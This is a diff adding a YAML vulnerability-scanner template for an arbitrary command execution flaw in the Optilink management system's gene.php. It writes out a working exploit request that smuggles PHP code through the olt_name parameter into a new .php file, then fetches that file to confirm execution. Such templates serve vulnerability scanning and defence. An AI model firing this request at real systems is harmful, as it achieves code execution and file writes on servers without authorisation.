@@ -1,0 +1,22 @@
+id: CVD-2022-0974
+info:
+  name: Optilink 管理系统 gene.php 任意命令执行漏洞
+  author: wangzong
+  severity: critical
+  description: Optilink 管理系统 gene.php 任意命令执行漏洞
+  reference:
+    - https://github.com/zan8in/pxplan/blob/fd87ef720bf9e7550512ef22bf1f84c3895e8b1c/goby_pocs/10-13-crack/redteam_20220408164048/CVD-2022-0974.go#L70
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi/fsystem/gene.php?olt_op=1&olt_name=\"<?php%20echo%20md5(1231);unlink(__FILE__);?>\">{{filename}}.php;"
+      - "{{BaseURL}}/cgi/fsystem/{{filename}}.php"
+      
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '6c14da109e294d1e8155be8aa4b1ce8e'
